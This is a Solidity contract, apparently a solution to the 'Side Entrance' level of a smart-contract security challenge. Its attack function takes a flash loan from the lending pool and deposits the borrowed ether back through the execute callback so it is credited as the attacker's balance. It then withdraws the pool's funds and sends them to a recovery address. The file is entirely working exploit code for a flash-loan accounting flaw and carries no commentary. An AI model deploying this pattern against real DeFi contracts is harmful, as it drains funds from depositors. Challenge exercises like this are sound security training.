// SPDX-License-Identifier: MIT
 pragma solidity 0.8.25;

 import "../side-entrance/SideEntranceLenderPool.sol";
 import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

 contract AttackSideEntrance {
    SideEntranceLenderPool pool;
    address public recovery;
    uint256 public amountToAttack;

    constructor(address _pool, address _recovery, uint256 _amount) {
        pool = SideEntranceLenderPool(_pool);
        recovery = _recovery;
        amountToAttack = _amount;
    }

    function attack() external returns(bool) {
        pool.flashLoan(amountToAttack);
        pool.withdraw();

        payable(recovery).transfer(amountToAttack);

        return true;
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {
    
    }
 }